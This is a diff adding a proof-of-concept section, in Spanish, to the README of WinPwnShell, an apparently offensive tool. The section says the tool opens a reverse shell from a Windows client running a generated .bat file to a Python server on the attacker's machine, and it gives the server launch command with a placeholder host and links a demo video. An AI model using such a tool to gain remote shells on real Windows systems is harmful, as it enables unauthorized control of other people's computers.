@@ -88,7 +88,27 @@ Además, la herramienta genera un archivo de log que registra todos los comandos
    Conexión terminada. Cerrando servidor...
    ```
 
+## Prueba de Concepto (PoC)
+
+A continuación, se muestra una prueba de concepto de cómo **WinPwnShell** establece una reverse shell entre un servidor Python y un cliente Windows.
+
+1. Se ejecuta el servidor en la máquina atacante:
+   ```bash
+   python3 winpwnshell.py http://servidor.ejemplo.com 8080
+   ```
+
+2. El cliente Windows ejecuta el archivo `.bat` generado, lo que inicia la conexión remota.
+
+3. El servidor recibe comandos remotos y muestra las salidas en tiempo real.
+
+### Video demostrativo
+
+Puedes ver una demostración completa en el siguiente video:
+
+[![PoC Video](https://img.youtube.com/vi/1t9yVPl3im8/0.jpg)](https://www.youtube.com/shorts/1t9yVPl3im8)
+
+Haz clic en la imagen para ver el video en YouTube.
+
 ## Licencia
 
 Este proyecto está licenciado bajo los términos de la [Licencia MIT](LICENSE).
-
